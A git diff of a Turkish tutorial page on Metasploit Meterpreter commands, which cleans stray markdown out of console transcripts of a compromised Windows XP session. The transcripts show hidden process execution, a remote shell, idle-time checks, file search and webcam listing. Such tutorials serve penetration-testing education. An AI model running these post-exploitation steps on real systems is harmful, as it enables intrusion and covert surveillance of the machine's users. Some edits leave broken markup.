@@ -2,7 +2,7 @@
 draft: false
 title: Metasploit İçinde Meterpreter Komutları
 linkTitle: Meterpreter Komutları
-translation_key: metasploit-meterpreter-commands
+translationKey:: metasploit-meterpreter-commands
 date: 2017-05-14T12:47:00+03:00
 author: İbrahim Korucuoğlu ([@siberoloji](https://github.com/siberoloji))
 description: Metasploit içinde kullanılabilecek Meterpreter komutları hakkında bilgi verir.
@@ -43,7 +43,7 @@ Core Commands
 
 ```bash
 meterpreter > background
-msf exploit**(**ms08_067_netapi**)** > sessions -i 1
+msf exploit(ms08_067_netapi) > sessions -i 1
 > Starting interaction with 1...
 
 meterpreter >
@@ -129,7 +129,7 @@ meterpreter > execute -f cmd.exe -i -H
 Process 38320 created.
 Channel 1 created.
 Microsoft Windows XP **[**Version 5.1.2600]
-**(**C**)** Copyright 1985-2001 Microsoft Corp.
+(C) Copyright 1985-2001 Microsoft Corp.
 
 C:\WINDOWS\system32>
 ```
@@ -172,7 +172,7 @@ Karşı taraftaki bilgisayar kullanıcısının, ne kadar zamandır işlem yapma
 
 ```bash
 meterpreter > idletime
-User has been idle **for**: 5 hours 26 mins 35 secs
+User has been idle for**: 5 hours 26 mins 35 secs
 meterpreter >
 ```
 
@@ -274,7 +274,7 @@ Burada dikkat edilmesi gereken konu, resource komutuna ilk vereceğiniz dosya ye
 
 ```bash
 meterpreter > resource 
-Usage: resource path1 path2Run the commands stored **in **the supplied files.
+Usage: resource path1 path2Run the commands stored **in the supplied files.
 meterpreter >
 ARGUMENTS:
 
@@ -306,7 +306,7 @@ Mode              Size    Type  Last modified              Name
 > Running background
 
 > Backgrounding session 1...
-msf  exploit**(**handler**)** >
+msf  exploit(handler) >
 ```
 
 ## search
@@ -319,7 +319,7 @@ Found 1 result...
     c:\AUTOEXEC.BAT
 meterpreter > search -f sea*****.bat c:\\xamp\\
 Found 1 result...
-    c:\\xampp\perl\b**in**\search.bat **(**57035 bytes**)**
+    c:\\xampp\perl\b**in**\search.bat (57035 bytes)
 meterpreter >
 ```
 
@@ -332,7 +332,7 @@ meterpreter > shell
 Process 39640 created.
 Channel 2 created.
 Microsoft Windows XP **[**Version 5.1.2600]
-**(**C**)** Copyright 1985-2001 Microsoft Corp.
+(C) Copyright 1985-2001 Microsoft Corp.
 
 C:\WINDOWS\system32>
 ```
@@ -355,7 +355,7 @@ Hedef sistemde kullanılabilir durumda olan web kameralarını listeler.
 ```bash
 meterpreter > webcam_list
 1: Creative WebCam NX Pro
-2: Creative WebCam NX Pro **(**VFW**)**
+2: Creative WebCam NX Pro (VFW)
 meterpreter >
 ```
 
